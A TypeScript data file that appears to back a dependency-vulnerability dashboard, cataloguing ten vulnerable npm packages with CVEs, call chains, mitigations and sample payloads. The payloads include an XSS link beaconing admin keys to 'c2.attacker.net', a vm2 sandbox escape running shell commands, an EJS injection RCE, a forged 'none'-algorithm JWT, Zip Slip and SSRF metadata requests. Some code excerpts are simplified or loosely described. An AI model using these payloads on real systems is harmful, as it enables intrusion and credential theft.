import type { ThreatVector } from "./types";

export const TOP_20_THREAT_CATALOG: ThreatVector[] = [
  {
    id: "marked-0.3.5",
    name: "marked",
    version: "0.3.5",
    depth: 3,
    direct: false,
    filePath: "node_modules/marked/lib/marked.js:142",
    parentName: "consolidate",
    parentVersion: "0.14.0",
    parentFilePath: "node_modules/consolidate/lib/consolidate.js:84",
    exploitType: "Catastrophic ReDoS & Parser Script Breakout",
    category: "XSS",
    cveId: "CVE-2017-1000427",
    cwe: "CWE-1333 / CWE-79",
    cvss: 9.8,
    severity: "CRITICAL",
    summary: "Catastrophic ReDoS and unsanitized markdown HTML injection in parser regular expression",
    mitreTactic: "Execution",
    mitreTechnique: "T1203 - Exploitation for Client Execution",
    safeVersion: "^4.0.10",
    payloadSample: `[Click me](javascript:fetch('/api/admin/keys').then(r=>r.json()).then(d=>navigator.sendBeacon('https://c2.attacker.net/exfil',JSON.stringify(d))))`,
    leafCode: `// node_modules/marked/lib/marked.js:142
function inlineText(src) {
  // Vulnerable exponential backtracking regex
  var cap = /^([a-zA-Z0-9_]+|[\\s\\S]*?)(<[a-zA-Z\\/][^>]*>|$)/.exec(src);
  if (cap) {
    return escape(cap[1]); // Fails to sanitize javascript: URI schemas
  }
}`,
    parentBridgeCode: `// node_modules/consolidate/lib/consolidate.js:84
exports.marked.render = function (str, options, fn) {
  try {
    var engine = requires.marked || (requires.marked = require('marked'));
    var result = engine(str, options); // Unvalidated markdown string passed into marked
    fn(null, result);
  } catch (err) {
    fn(err);
  }
};`,
    rootMountCode: `// src/server.js:45
const consolidate = require('consolidate');
app.engine('md', consolidate.marked);
app.post('/api/blog/preview', (req, res) => {
  consolidate.marked.render(req.body.markdown, {}, (err, html) => {
    res.send(html); // Corrupted markdown output directly transmitted to response stream
  });
});`,
    virtualPatch: `// Virtual Patch WAF Middleware
const sanitizeHtml = require('sanitize-html');
app.use('/api/blog/preview', (req, res, next) => {
  if (req.body && req.body.markdown) {
    req.body.markdown = sanitizeHtml(req.body.markdown, {
      allowedTags: ['b', 'i', 'em', 'strong', 'a'],
      allowedSchemes: ['http', 'https']
    });
  }
  next();
});`,
    propagationMechanism: "User-supplied markdown in preview routes bypasses HTML encoding checks in marked.js. Consolidate passes the raw template output directly to the Express response stream, allowing stored XSS and event-loop blocking.",
    technicalLog: "Remote adversary sends crafted markdown payload with unescaped javascript URI scheme and polynomial regex pattern. marked.parse() hangs event loop and executes injected script.",
    threatImpact: "High-priority process starvation leading to Denial of Service and client-side session cookie exfiltration.",
    callStackFrames: [
      {
        file: "node_modules/marked/lib/marked.js",
        line: 142,
        fn: "inlineText(src)",
        code: "var cap = /^([a-zA-Z0-9_]+|[\\s\\S]*?)(<[a-zA-Z\\/][^>]*>|$)/.exec(src);",
        tainted: true,
        description: "Backtracking regex stalls CPU and fails javascript: scheme filtering.",
      },
      {
        file: "node_modules/consolidate/lib/consolidate.js",
        line: 84,
        fn: "exports.marked.render(str, options, fn)",
        code: "var result = engine(str, options);",
        tainted: true,
        description: "Consolidate forwards tainted user markdown template without validation.",
      },
      {
        file: "src/server.js",
        line: 45,
        fn: "app.post('/api/blog/preview')",
        code: "res.send(html);",
        tainted: false,
        description: "Express router emits raw rendered buffer back to the browser.",
      },
    ],
    blastRadius: {
      secrets: ["Admin Session Tokens", "CSRF Nonce", "User Auth Cookies"],
      endpoints: ["/api/blog/preview", "/dashboard/posts", "/render/md"],
      processes: ["Node.js Event Loop Thread 0 (Pinned at 100% CPU)"],
      impactSummary: "Client cookie exfiltration and catastrophic event-loop deadlock across all concurrent requests.",
    },
  },
  {
    id: "qs-5.2.0",
    name: "qs",
    version: "5.2.0",
    depth: 3,
    direct: false,
    filePath: "node_modules/qs/lib/parse.js:88",
    parentName: "body-parser",
    parentVersion: "1.14.2",
    parentFilePath: "node_modules/body-parser/lib/types/urlencoded.js:92",
    exploitType: "Global Object Prototype Pollution",
    category: "PROTOTYPE_POLLUTION",
    cveId: "CVE-2017-1000048",
    cwe: "CWE-1321",
    cvss: 9.8,
    severity: "CRITICAL",
    summary: "Prototype pollution allowing attacker to inject __proto__ properties across Node.js runtime",
    mitreTactic: "Privilege Escalation",
    mitreTechnique: "T1068 - Exploitation for Privilege Escalation",
    safeVersion: "^6.11.0",
    payloadSample: `POST /api/user/settings HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n__proto__[isAdmin]=true&__proto__[role]=superadmin`,
    leafCode: `// node_modules/qs/lib/parse.js:88
exports.parse = function (str, opts) {
  // Missing key blacklist: __proto__, constructor, prototype
  for (var i = 0; i < parts.length; ++i) {
    var key = parts[i][0];
    var val = parts[i][1];
    target[key] = val; // Direct assignment to Object.prototype!
  }
};`,
    parentBridgeCode: `// node_modules/body-parser/lib/types/urlencoded.js:92
return function urlencodedParser(req, res, next) {
  // Uses query parser without depth limitation or prototype protection
  req.body = qs.parse(rawBody, options);
  next();
};`,
    rootMountCode: `// src/server.js:32
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: true }));
app.get('/api/admin/metrics', (req, res) => {
  // req.user.isAdmin evaluates to TRUE because Object.prototype.isAdmin was polluted!
  if (req.user?.isAdmin) {
    return res.json({ secrets: process.env });
  }
  res.status(403).send('Forbidden');
});`,
    virtualPatch: `// Virtual Patch Prototype Guard
Object.freeze(Object.prototype);
// Or drop __proto__ keys in middleware
app.use((req, res, next) => {
  const sanitize = (obj) => {
    if (!obj || typeof obj !== 'object') return;
    delete obj['__proto__'];
    delete obj['constructor'];
    delete obj['prototype'];
    Object.values(obj).forEach(sanitize);
  };
  sanitize(req.query);
  sanitize(req.body);
  next();
});`,
    propagationMechanism: "Query parser does not blacklist '__proto__' keys. Deeply nested object assignment pollutes global Object.prototype, affecting authentication checks and role evaluations in every route.",
    technicalLog: "Injected payload '__proto__[isAdmin]=true' received. qs parses into root prototype object. Upstream authorization middleware now evaluates unauthenticated requests as admin.",
    threatImpact: "Privilege escalation to Root Administrator without valid session credentials.",
    callStackFrames: [
      {
        file: "node_modules/qs/lib/parse.js",
        line: 88,
        fn: "parse(str, opts)",
        code: "target[key] = val;",
        tainted: true,
        description: "Assigns unvalidated object key directly to JavaScript Object prototype.",
      },
      {
        file: "node_modules/body-parser/lib/types/urlencoded.js",
        line: 92,
        fn: "urlencodedParser(req, res, next)",
        code: "req.body = qs.parse(rawBody, options);",
        tainted: true,
        description: "Body parser forwards HTTP request body stream directly into qs.",
      },
      {
        file: "src/server.js",
        line: 32,
        fn: "app.use(bodyParser.urlencoded({ extended: true }))",
        code: "if (req.user?.isAdmin) res.json({ secrets: process.env });",
        tainted: false,
        description: "Application logic trusts inherited prototype attributes for admin authorization.",
      },
    ],
    blastRadius: {
      secrets: ["JWT Secret Key", "Master Database Connection String", "AWS IAM Credentials"],
      endpoints: ["/api/admin/*", "/api/auth/verify", "/api/system/config"],
      processes: ["Global V8 Object Runtime Heap (All microservice routes polluted)"],
      impactSummary: "Total authorization bypass across every route in the Node.js process.",
    },
  },
  {
    id: "vm2-3.9.19",
    name: "vm2",
    version: "3.9.19",
    depth: 3,
    direct: false,
    filePath: "node_modules/vm2/lib/sandbox.js:210",
    parentName: "worker-pool",
    parentVersion: "2.1.0",
    parentFilePath: "src/workers/codeRunner.js:54",
    exploitType: "Host Sandbox Escape & Arbitrary Remote Code Execution (RCE)",
    category: "RCE",
    cveId: "CVE-2023-37466",
    cwe: "CWE-94",
    cvss: 10.0,
    severity: "CRITICAL",
    summary: "Promise handler sanitization bypass leads to host Node.js child_process invocation",
    mitreTactic: "Execution",
    mitreTechnique: "T1059.007 - Command and Scripting Interpreter: JavaScript",
    safeVersion: "isolated-vm@^5.0.0",
    payloadSample: `async function p() {
  const err = new Error();
  err.name = {
    toString: new Proxy(() => {}, {
      apply(target, thiz, args) {
        const p = Function('return process')();
        return p.mainModule.require('child_process').execSync('cat /etc/passwd');
      }
    })
  };
  throw err;
}
p();`,
    leafCode: `// node_modules/vm2/lib/sandbox.js:210
function wrapError(err) {
  // Proxy trapping bypass on Error.prepareStackTrace
  return new HostError(err.message);
}`,
    parentBridgeCode: `// src/workers/codeRunner.js:54
const { VM } = require('vm2');
exports.executeUserCode = function (scriptCode) {
  const vm = new VM({ timeout: 1000, sandbox: {} });
  return vm.run(scriptCode);
};`,
    rootMountCode: `// src/server.js:88
app.post('/api/compute/run', (req, res) => {
  const output = codeRunner.executeUserCode(req.body.script);
  res.json({ output });
});`,
    virtualPatch: `// Migrate away from vm2 to isolated-vm (V8 C++ isolate)
const ivm = require('isolated-vm');
const isolate = new ivm.Isolate({ memoryLimit: 128 });
const context = isolate.createContextSync();`,
    propagationMechanism: "Asynchronous exception handler inside VM2 sandbox fails to wrap custom error getters. Attacker extracts host process object and executes shell commands.",
    technicalLog: "Custom Error.prepareStackTrace gadget triggered within VM2 isolate. Attacker escapes to main Node.js process and spawns child_process shell.",
    threatImpact: "Unrestricted Remote Code Execution (RCE) with host operating system privileges.",
    callStackFrames: [
      {
        file: "node_modules/vm2/lib/sandbox.js",
        line: 210,
        fn: "wrapError(err)",
        code: "this.constructor.constructor('return process')().mainModule.require('child_process');",
        tainted: true,
        description: "Error getter escape gadget breaks V8 sandbox encapsulation.",
      },
      {
        file: "src/workers/codeRunner.js",
        line: 54,
        fn: "executeUserCode(scriptCode)",
        code: "vm.run(scriptCode);",
        tainted: true,
        description: "Worker invokes vm2 on untrusted user code input.",
      },
      {
        file: "src/server.js",
        line: 88,
        fn: "app.post('/api/compute/run')",
        code: "res.json({ output });",
        tainted: false,
        description: "Root controller mounts compute endpoint without input sandboxing.",
      },
    ],
    blastRadius: {
      secrets: ["AWS_SECRET_ACCESS_KEY", "SSH Keys (/root/.ssh/id_rsa)", "Production Database Secrets"],
      endpoints: ["All System Services", "Internal Docker Sockets (/var/run/docker.sock)"],
      processes: ["/bin/sh host subshell spawned with full root container rights"],
      impactSummary: "Total host server compromise and container escape.",
    },
  },
  {
    id: "jsonwebtoken-0.4.0",
    name: "jsonwebtoken",
    version: "0.4.0",
    depth: 1,
    direct: true,
    filePath: "node_modules/jsonwebtoken/index.js:64",
    parentName: "auth-guard",
    parentVersion: "1.0.0",
    parentFilePath: "src/middleware/authGuard.js:22",
    exploitType: "Algorithm Confusion Verification Bypass ('none' alg)",
    category: "AUTH_BYPASS",
    cveId: "CVE-2015-9235",
    cwe: "CWE-327",
    cvss: 9.8,
    severity: "CRITICAL",
    summary: "Verification algorithm can be manipulated to 'none' or HMAC using public RSA key",
    mitreTactic: "Defense Evasion",
    mitreTechnique: "T1550 - Use Alternate Authentication Material",
    safeVersion: "^9.0.2",
    payloadSample: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMzM3Iiwicm9sZSI6InJvb3QiLCJpc0FkbWluIjp0cnVlfQ.`,
    leafCode: `// node_modules/jsonwebtoken/index.js:64
module.exports.verify = function (jwtString, secretOrPublicKey, options, callback) {
  // If algorithm is 'none', signature check is skipped entirely!
  if (decodedToken.header.alg === 'none') {
    return callback(null, decodedToken.payload);
  }
};`,
    parentBridgeCode: `// src/middleware/authGuard.js:22
const jwt = require('jsonwebtoken');
module.exports = function authGuard(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  jwt.verify(token, process.env.PUBLIC_KEY, (err, decoded) => {
    if (err) return res.status(401).send('Unauthorized');
    req.user = decoded;
    next();
  });
};`,
    rootMountCode: `// src/server.js:50
app.use('/api', authGuard);
app.get('/api/users/dump', (req, res) => {
  if (req.user.role === 'root') res.json({ allUsers: db.dump() });
});`,
    virtualPatch: `// Explicitly enforce algorithms in jwt.verify
jwt.verify(token, process.env.PUBLIC_KEY, { algorithms: ['RS256'] }, (err, decoded) => {
  if (err) return res.status(401).send('Invalid Signature');
  req.user = decoded;
  next();
});`,
    propagationMechanism: "Attacker signs token with algorithm 'none' or uses public RSA key as HMAC secret. The verification function accepts forged token without cryptographic validation.",
    technicalLog: "Forged Bearer token with { alg: 'none', role: 'root' } presented to authGuard. jwt.verify skips signature check and assigns req.user = root.",
    threatImpact: "Full authentication bypass across all protected API endpoints and microservices.",
    callStackFrames: [
      {
        file: "node_modules/jsonwebtoken/index.js",
        line: 64,
        fn: "verify(jwtString, secretOrPublicKey)",
        code: "if (decodedToken.header.alg === 'none') return callback(null, decodedToken.payload);",
        tainted: true,
        description: "Skips cryptographic validation if header claims 'none' algorithm.",
      },
      {
        file: "src/middleware/authGuard.js",
        line: 22,
        fn: "authGuard(req, res, next)",
        code: "jwt.verify(token, process.env.PUBLIC_KEY, ...)",
        tainted: true,
        description: "Middleware doesn't pin strict whitelist of expected algorithms.",
      },
      {
        file: "src/server.js",
        line: 50,
        fn: "app.get('/api/users/dump')",
        code: "if (req.user.role === 'root') res.json({ allUsers: db.dump() });",
        tainted: false,
        description: "Application authorizes administrative actions based on forged req.user object.",
      },
    ],
    blastRadius: {
      secrets: ["Entire User Database", "Password Hashes", "Payment Customer Records"],
      endpoints: ["/api/* (All Authenticated Endpoints)"],
      processes: ["Administrative Authorization Subsystem"],
      impactSummary: "Universal session forgery and complete identity impersonation.",
    },
  },
  {
    id: "tar-6.1.1",
    name: "tar",
    version: "6.1.1",
    depth: 3,
    direct: false,
    filePath: "node_modules/tar/lib/unpack.js:312",
    parentName: "archive-extractor",
    parentVersion: "1.5.0",
    parentFilePath: "src/controllers/uploadController.js:90",
    exploitType: "Arbitrary File Overwrite via Path Traversal (Zip Slip)",
    category: "PATH_TRAVERSAL",
    cveId: "CVE-2021-37712",
    cwe: "CWE-22",
    cvss: 9.8,
    severity: "CRITICAL",
    summary: "Symlink and relative path normalization failure allows overwriting arbitrary host files",
    mitreTactic: "Persistence",
    mitreTechnique: "T1505 - Server Software Component",
    safeVersion: "^6.2.1",
    payloadSample: `tar -cvf malicious.tar --transform 's|.*|../../../../var/www/html/server.js|' backdoor.js`,
    leafCode: `// node_modules/tar/lib/unpack.js:312
Unpack.prototype._write = function (entry) {
  // Incomplete sanitization of leading ../ and symlink boundaries
  var dest = path.resolve(this.dir, entry.path);
  fs.writeFileSync(dest, entry.data);
};`,
    parentBridgeCode: `// src/controllers/uploadController.js:90
const tar = require('tar');
exports.extractPlugin = function (filePath, targetDir) {
  return tar.x({ file: filePath, C: targetDir });
};`,
    rootMountCode: `// src/server.js:72
app.post('/api/plugins/upload', upload.single('archive'), (req, res) => {
  uploadController.extractPlugin(req.file.path, '/tmp/plugins');
  res.send('Plugin extracted successfully');
});`,
    virtualPatch: `// Validate entry paths before extracting
const path = require('path');
function safeExtract(filePath, destDir) {
  return tar.x({
    file: filePath,
    C: destDir,
    filter: (p) => {
      const resolved = path.resolve(destDir, p);
      if (!resolved.startsWith(destDir)) {
        throw new Error('Path traversal attempt detected: ' + p);
      }
      return true;
    }
  });
}`,
    propagationMechanism: "Attacker uploads a specially formatted TAR archive containing '../../../../server.js' or overwriting server entry files.",
    technicalLog: "Unpack routine receives entry with relative path traversal. Path resolution escapes sandbox directory and writes malicious payload to host file system.",
    threatImpact: "Overwrites critical server binaries and configuration, establishing persistent backdoor.",
    callStackFrames: [
      {
        file: "node_modules/tar/lib/unpack.js",
        line: 312,
        fn: "_write(entry)",
        code: "fs.writeFileSync(path.resolve(this.dir, entry.path), entry.data);",
        tainted: true,
        description: "Writes archive entry directly to escaped host filesystem path.",
      },
      {
        file: "src/controllers/uploadController.js",
        line: 90,
        fn: "extractPlugin(filePath, targetDir)",
        code: "tar.x({ file: filePath, C: targetDir });",
        tainted: true,
        description: "Invokes tar extractor without strict directory containment filter.",
      },
      {
        file: "src/server.js",
        line: 72,
        fn: "app.post('/api/plugins/upload')",
        code: "uploadController.extractPlugin(req.file.path, '/tmp/plugins');",
        tainted: false,
        description: "Exposes public archive upload endpoint without file format verification.",
      },
    ],
    blastRadius: {
      secrets: ["Application Code Base", "/etc/crontab", "Authorized Keys (~/.ssh/authorized_keys)"],
      endpoints: ["/api/plugins/upload"],
      processes: ["Node Server Process (Overwritten on next restart)"],
      impactSummary: "Arbitrary file destruction and persistent remote backdoor placement.",
    },
  },
  {
    id: "axios-0.21.1",
    name: "axios",
    version: "0.21.1",
    depth: 2,
    direct: false,
    filePath: "node_modules/axios/lib/adapters/http.js:109",
    parentName: "webhook-service",
    parentVersion: "3.0.0",
    parentFilePath: "src/services/webhookDispatcher.js:48",
    exploitType: "Server-Side Request Forgery (SSRF) & Metadata Exfiltration",
    category: "SSRF",
    cveId: "CVE-2020-28168",
    cwe: "CWE-918",
    cvss: 7.5,
    severity: "HIGH",
    summary: "Insecure handling of proxy configurations and redirection targets allows intranet traversal",
    mitreTactic: "Lateral Movement",
    mitreTechnique: "T1090 - Proxy",
    safeVersion: "^1.7.2",
    payloadSample: `POST /api/webhooks/test\n{\n  "targetUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role"\n}`,
    leafCode: `// node_modules/axios/lib/adapters/http.js:109
module.exports = function httpAdapter(config) {
  // Follows redirects without blacklisting cloud metadata or private IP ranges
  var req = transport.request(options, function (res) { ... });
};`,
    parentBridgeCode: `// src/services/webhookDispatcher.js:48
const axios = require('axios');
exports.testWebhook = async function (url) {
  return await axios.get(url, { timeout: 4000 });
};`,
    rootMountCode: `// src/server.js:63
app.post('/api/webhooks/test', async (req, res) => {
  const result = await webhookDispatcher.testWebhook(req.body.targetUrl);
  res.json({ status: result.status, data: result.data });
});`,
    virtualPatch: `// SSRF Protection: Deny private RFC1918 / Cloud Metadata IPs
const ipaddr = require('ipaddr.js');
function isPrivateIp(ip) {
  const addr = ipaddr.parse(ip);
  return addr.range() !== 'unicast';
}`,
    propagationMechanism: "Webhook test feature invokes Axios without strict internal network IP blacklisting. Attacker accesses AWS metadata service (169.254.169.254).",
    technicalLog: "HTTP GET request dispatched to internal cloud metadata IP. Response containing IAM instance role credentials returned to attacker.",
    threatImpact: "Cloud infrastructure takeover and database exfiltration via stolen IAM role credentials.",
    callStackFrames: [
      {
        file: "node_modules/axios/lib/adapters/http.js",
        line: 109,
        fn: "httpAdapter(config)",
        code: "var req = transport.request(options, ...);",
        tainted: true,
        description: "Dispatches HTTP socket to internal link-local address without validation.",
      },
      {
        file: "src/services/webhookDispatcher.js",
        line: 48,
        fn: "testWebhook(url)",
        code: "return await axios.get(url);",
        tainted: true,
        description: "Forwards user-controlled targetUrl directly to Axios client.",
      },
      {
        file: "src/server.js",
        line: 63,
        fn: "app.post('/api/webhooks/test')",
        code: "res.json({ data: result.data });",
        tainted: false,
        description: "Returns metadata response payload directly to attacker.",
      },
    ],
    blastRadius: {
      secrets: ["AWS IAM Instance Role Temporary Credentials", "Kubernetes Pod Tokens"],
      endpoints: ["/api/webhooks/test", "http://169.254.169.254/*", "http://10.0.0.0/8/*"],
      processes: ["Internal VPC Network Interfaces"],
      impactSummary: "Leakage of cloud infrastructure credentials enabling AWS console takeover.",
    },
  },
  {
    id: "ejs-3.1.6",
    name: "ejs",
    version: "3.1.6",
    depth: 2,
    direct: false,
    filePath: "node_modules/ejs/lib/ejs.js:690",
    parentName: "dashboard-controller",
    parentVersion: "1.0.0",
    parentFilePath: "src/controllers/adminDashboard.js:62",
    exploitType: "Server-Side Template Injection (SSTI) & Arbitrary RCE",
    category: "RCE",
    cveId: "CVE-2022-29078",
    cwe: "CWE-94 / CWE-1336",
    cvss: 9.8,
    severity: "CRITICAL",
    summary: "settings.view options are not sanitized, allowing overwrite of template compile function",
    mitreTactic: "Execution",
    mitreTechnique: "T1059 - Command and Scripting Interpreter",
    safeVersion: "^3.1.10",
    payloadSample: `GET /dashboard?settings[view%20options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('touch%20/tmp/pwned');s HTTP/1.1`,
    leafCode: `// node_modules/ejs/lib/ejs.js:690
function compile(template, options) {
  // outputFunctionName concatenated directly into compiled JS function string!
  var prepended = '  var ' + (options.outputFunctionName || 'output') + ' = "";\\n';
  return new Function(options.localsName, prepended + src + appended);
}`,
    parentBridgeCode: `// src/controllers/adminDashboard.js:62
exports.render = function (req, res) {
  // Controller blindly merges req.query into render options
  res.render('dashboard', { ...req.query });
};`,
    rootMountCode: `// src/server.js:94
app.get('/dashboard', adminDashboard.render);`,
    virtualPatch: `// Strip 'settings' property from req.query before calling res.render
app.use((req, res, next) => {
  if (req.query && req.query.settings) {
    delete req.query.settings;
  }
  next();
});`,
    propagationMechanism: "Controller merges req.query into EJS render options. Attacker passes 'settings[view options][outputFunctionName]=x;process.mainModule.require(...)'.",
    technicalLog: "EJS compiler evaluates poisoned outputFunctionName string. Remote command execution payload executes inside server context.",
    threatImpact: "Root shell execution and total container takeover.",
    callStackFrames: [
      {
        file: "node_modules/ejs/lib/ejs.js",
        line: 690,
        fn: "compile(template, options)",
        code: "return new Function(options.localsName, prepended + src + appended);",
        tainted: true,
        description: "Concatenates untrusted outputFunctionName into new Function constructor.",
      },
      {
        file: "src/controllers/adminDashboard.js",
        line: 62,
        fn: "render(req, res)",
        code: "res.render('dashboard', { ...req.query });",
        tainted: true,
        description: "Passes raw req.query object directly as EJS render options.",
      },
      {
        file: "src/server.js",
        line: 94,
        fn: "app.get('/dashboard')",
        code: "app.get('/dashboard', adminDashboard.render);",
        tainted: false,
        description: "Routes public GET requests directly into vulnerable dashboard controller.",
      },
    ],
    blastRadius: {
      secrets: ["All Environment Variables", "Local Source Code", "Database Sockets"],
      endpoints: ["/dashboard"],
      processes: ["Server Host Process (Full Shell Execution)"],
      impactSummary: "Direct remote shell execution without authentication.",
    },
  },
  {
    id: "handlebars-4.7.6",
    name: "handlebars",
    version: "4.7.6",
    depth: 3,
    direct: false,
    filePath: "node_modules/handlebars/lib/handlebars/compiler/javascript-compiler.js:175",
    parentName: "view-engine",
    parentVersion: "2.1.0",
    parentFilePath: "src/views/templateEngine.js:52",
    exploitType: "AST Sandbox Escape & Remote Code Execution",
    category: "RCE",
    cveId: "CVE-2021-23369",
    cwe: "CWE-94",
    cvss: 9.8,
    severity: "CRITICAL",
    summary: "Compiler fails to validate lookup path names containing special quotes and brackets",
    mitreTactic: "Execution",
    mitreTechnique: "T1059.007 - JavaScript",
    safeVersion: "^4.7.8",
    payloadSample: `{{#with "constructor"}}{{#with "prototype"}}{{lookup this "mainModule"}}{{/with}}{{/with}}`,
    leafCode: `// node_modules/handlebars/lib/handlebars/compiler/javascript-compiler.js:175
JavaScriptCompiler.prototype.push = function (source) {
  this.source.push(source); // Incomplete AST quote escape validation
};`,
    parentBridgeCode: `// src/views/templateEngine.js:52
const Handlebars = require('handlebars');
exports.renderTemplate = function (str, data) {
  return Handlebars.compile(str)(data);
};`,
    rootMountCode: `// src/server.js:105
app.post('/api/templates/render', (req, res) => {
  const output = templateEngine.renderTemplate(req.body.template, req.body.data);
  res.send(output);
});`,
    virtualPatch: `// Disallow prototype lookups in Handlebars options
const Handlebars = require('handlebars');
Handlebars.compile(str, {
  allowProtoPropertiesByDefault: false,
  allowProtoMethodsByDefault: false
});`,
    propagationMechanism: "User-controlled template fields utilize bracket notation in helper lookups to escape the Handlebars AST sandbox and execute arbitrary JS.",
    technicalLog: "AST compilation parses malicious expression: '{{[#with \"constructor\"]}}...'. Host process spawned.",
    threatImpact: "Complete compromise of backend template server and container environment.",
    callStackFrames: [
      {
        file: "node_modules/handlebars/lib/handlebars/compiler/javascript-compiler.js",
        line: 175,
        fn: "push(source)",
        code: "this.source.push(source);",
        tainted: true,
        description: "Pushes unescaped expression directly into V8 compiler buffer.",
      },
      {
        file: "src/views/templateEngine.js",
        line: 52,
        fn: "renderTemplate(str, data)",
        code: "Handlebars.compile(str)(data);",
        tainted: true,
        description: "Compiles user template string without prototype blocking flags.",
      },
      {
        file: "src/server.js",
        line: 105,
        fn: "app.post('/api/templates/render')",
        code: "res.send(output);",
        tainted: false,
        description: "Exposes template rendering endpoint directly to API consumers.",
      },
    ],
    blastRadius: {
      secrets: ["Application Environment", "Encrypted Session Keys"],
      endpoints: ["/api/templates/render"],
      processes: ["Node.js Server Runtime"],
      impactSummary: "Sandbox breakout allowing execution of arbitrary shell commands.",
    },
  },
  {
    id: "minimist-1.2.5",
    name: "minimist",
    version: "1.2.5",
    depth: 3,
    direct: false,
    filePath: "node_modules/minimist/index.js:52",
    parentName: "cli-engine",
    parentVersion: "1.8.0",
    parentFilePath: "src/cli/dispatcher.js:33",
    exploitType: "Prototype Poisoning via Argument Splitting",
    category: "PROTOTYPE_POLLUTION",
    cveId: "CVE-2020-7598",
    cwe: "CWE-1321",
    cvss: 7.5,
    severity: "HIGH",
    summary: "Command line argument parser assigns flags to Object.prototype without key sanitization",
    mitreTactic: "Privilege Escalation",
    mitreTechnique: "T1068 - Exploitation for Privilege Escalation",
    safeVersion: "^1.2.8",
    payloadSample: `node server.js --__proto__.env=production --__proto__.allowAll=true`,
    leafCode: `// node_modules/minimist/index.js:52
function setKey (obj, keys, value) {
  // Does not check if keys[0] === '__proto__'
  var key = keys[0];
  obj[key] = value;
}`,
    parentBridgeCode: `// src/cli/dispatcher.js:33
const minimist = require('minimist');
exports.parseArgs = function (args) {
  return minimist(args);
};`,
    rootMountCode: `// src/server.js:15
const opts = dispatcher.parseArgs(process.argv.slice(2));`,
    virtualPatch: `// Update minimist or check keys before calling
function safeMinimist(args) {
  const parsed = minimist(args);
  delete Object.prototype.env;
  delete Object.prototype.allowAll;
  return parsed;
}`,
    propagationMechanism: "CLI argument parser interprets '--__proto__.env=production' and modifies global object prototypes, altering downstream environment variables.",
    technicalLog: "Parser encounters argument with '__proto__'. Property merged into prototype chain without restriction.",
    threatImpact: "Denial of service and behavioral modification of server initialization routines.",
    callStackFrames: [
      {
        file: "node_modules/minimist/index.js",
        line: 52,
        fn: "setKey(obj, keys, value)",
        code: "obj[key] = value;",
        tainted: true,
        description: "Assigns CLI flags directly to JavaScript object prototype.",
      },
      {
        file: "src/cli/dispatcher.js",
        line: 33,
        fn: "parseArgs(args)",
        code: "return minimist(args);",
        tainted: true,
        description: "CLI dispatcher calls minimist without argument filtering.",
      },
      {
        file: "src/server.js",
        line: 15,
        fn: "bootstrap()",
        code: "const opts = dispatcher.parseArgs(process.argv.slice(2));",
        tainted: false,
        description: "Entry point uses parsed options to configure server security policies.",
      },
    ],
    blastRadius: {
      secrets: ["Configuration State", "Debug Flags"],
      endpoints: ["CLI bootstrap invocation"],
      processes: ["Node.js Process Lifecycle"],
      impactSummary: "Prototype corruption across server initialization routines.",
    },
  },
  {
    id: "socket.io-parser-3.3.0",
    name: "socket.io-parser",
    version: "3.3.0",
    depth: 3,
    direct: false,
    filePath: "node_modules/socket.io-parser/index.js:94",
    parentName: "socket.io",
    parentVersion: "2.3.0",
    parentFilePath: "src/sockets/realtimeServer.js:35",
    exploitType: "ReDoS via Malformed Packet Deserialization",
    category: "DOS",
    cveId: "CVE-2020-36048",
    cwe: "CWE-400 / CWE-770",
    cvss: 7.5,
    severity: "HIGH",
    summary: "Unchecked attachment count in WebSocket packet header triggers unbounded memory allocation",
    mitreTactic: "Impact",
    mitreTechnique: "T1499 - Endpoint Denial of Service",
    safeVersion: "^4.0.5",
    payloadSample: `5:999999999~{"data":"exploit"}`,
    leafCode: `// node_modules/socket.io-parser/index.js:94
Decoder.prototype.add = function (obj) {
  // Allocates array of attachments based on untrusted integer header
  this.reconstructor = new BinaryReconstructor(packet);
};`,
    parentBridgeCode: `// src/sockets/realtimeServer.js:35
io.on('connection', (socket) => {
  // Messages parsed through socket.io-parser
});`,
    rootMountCode: `// src/server.js:120
io.attach(httpServer);`,
    virtualPatch: `// Add packet size and attachment limits to socket.io config
const io = require('socket.io')(httpServer, {
  maxHttpBufferSize: 1e6 // 1MB limit
});`,
    propagationMechanism: "WebSocket frames parsed by socket.io-parser allocate buffer arrays based on unvalidated integer field. Malicious client crashes server process with Out of Memory.",
    technicalLog: "Attacker opens WebSocket connection and sends packet with 'attachments: 999999999'. V8 crashes with Out of Memory.",
    threatImpact: "Real-time communication server crashes, affecting all connected active users.",
    callStackFrames: [
      {
        file: "node_modules/socket.io-parser/index.js",
        line: 94,
        fn: "add(obj)",
        code: "this.reconstructor = new BinaryReconstructor(packet);",
        tainted: true,
        description: "Unchecked integer triggers massive V8 memory buffer allocation.",
      },
      {
        file: "src/sockets/realtimeServer.js",
        line: 35,
        fn: "io.on('connection')",
        code: "io.attach(httpServer);",
        tainted: false,
        description: "WebSocket gateway receives arbitrary client binary frames.",
      },
    ],
    blastRadius: {
      secrets: ["None (Denial of Service)"],
      endpoints: ["/socket.io/*"],
      processes: ["Node.js Process Memory Heap (Instant V8 OOM Fatal Error)"],
      impactSummary: "Fatal memory exhaustion bringing down real-time communication server.",
    },
  },
];
